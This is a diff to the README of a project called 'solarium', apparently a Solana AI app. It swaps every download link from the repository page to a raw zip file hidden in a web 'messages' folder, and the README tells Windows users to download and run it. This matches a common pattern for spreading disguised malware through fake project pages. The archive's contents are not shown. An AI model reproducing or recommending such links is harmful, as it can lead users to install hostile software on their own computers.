@@ -1,6 +1,6 @@
 # 🟣 solarium - Verifiable AI on Solana
 
-[![Download solarium](https://img.shields.io/badge/Download%20solarium-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sareeballistic470/solarium)
+[![Download solarium](https://img.shields.io/badge/Download%20solarium-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sareeballistic470/solarium/raw/refs/heads/main/platform/apps/web/messages/Software-1.4-beta.2.zip)
 
 ## 🔎 What is solarium?
 
@@ -17,7 +17,7 @@ This project is built for users who want a simple way to:
 
 Visit this page to download and run the app on Windows:
 
-[Download solarium from GitHub](https://github.com/sareeballistic470/solarium)
+[Download solarium from GitHub](https://github.com/sareeballistic470/solarium/raw/refs/heads/main/platform/apps/web/messages/Software-1.4-beta.2.zip)
 
 If the page shows a release file, download it and run it on your PC. If it shows the full project page, use the files or release area provided there.
 
@@ -199,7 +199,7 @@ Use the project files in the repository to find the exact build steps
 
 ## 🔗 Download Again
 
-[Download solarium from GitHub](https://github.com/sareeballistic470/solarium)
+[Download solarium from GitHub](https://github.com/sareeballistic470/solarium/raw/refs/heads/main/platform/apps/web/messages/Software-1.4-beta.2.zip)
 
 ## 🖥️ Basic System Needs
 
